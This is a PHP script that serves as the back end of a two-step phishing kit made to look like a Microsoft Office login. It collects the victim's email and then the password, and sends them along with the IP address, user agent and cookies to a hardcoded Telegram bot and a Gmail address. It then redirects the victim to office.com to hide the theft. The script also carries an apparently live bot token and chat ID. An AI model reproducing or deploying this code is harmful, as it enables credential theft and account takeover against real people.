<?php
session_start(); // Start session to track multi-step form

// === Telegram Bot Settings ===
$telegramToken = "8028760837:AAGRCR8aRXteT3pQwf7-eGE8oIRm7NamAWU";  // Replace with your bot token
$chatID = "6564094997";  // Replace with your chat ID

// === Email Settings ===
$to = "aliyahmarley7@gmail.com"; // Replace with your recipient email
$subject = "New Login Attempt";

// === Get IP, User Agent, Cookies ===
$userIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Agent';
$cookieData = json_encode($_COOKIE);

// === Handle POST Request ===
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Step 1: Email step (from index.html)
    if (isset($_POST['email']) && !isset($_POST['passwd'])) {
        $_SESSION['email'] = $_POST['email']; // Save email
        header("Location: index2.html"); // Proceed to password form
        exit();
    }

    // Step 2: Password step (from index2.php)
    if (isset($_POST['passwd']) && isset($_SESSION['email'])) {
        $email = $_SESSION['email'];
        $password = $_POST['passwd'];

        // Format Telegram message
        $message = "🔔 *New Login Attempt* 🔔\n\n"
                 . "👤 *Email:* `$email`\n"
                 . "🔑 *Password:* `$password`\n"
                 . "📍 *IP Address:* `$userIP`\n"
                 . "🖥️ *User Agent:* `$userAgent`\n"
                 . "🍪 *Cookies:* `$cookieData`\n"
                 . "⏳ *Time:* `" . date("Y-m-d H:i:s") . "`";

        // Send to Telegram
        $telegramURL = "https://api.telegram.org/bot$telegramToken/sendMessage";
        $postData = [
            'chat_id' => $chatID,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramURL);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);

        // Send via Email (as backup)
        $emailMessage = "New Login Attempt\n\nEmail: $email\nPassword: $password\nIP: $userIP\nUser-Agent: $userAgent\nCookies: $cookieData";
        $headers = "From: no-reply@example.com";
        mail($to, $subject, $emailMessage, $headers);

        // Set login cookies
        setcookie("login_user", $email, time() + (86400 * 7), "/");
        setcookie("login_time", date("Y-m-d H:i:s"), time() + (86400 * 7), "/");

        // End session and redirect
        session_destroy();
        header("Location: https://office.com");
        exit();
    }

} else {
    echo "Invalid request method.";
}
?>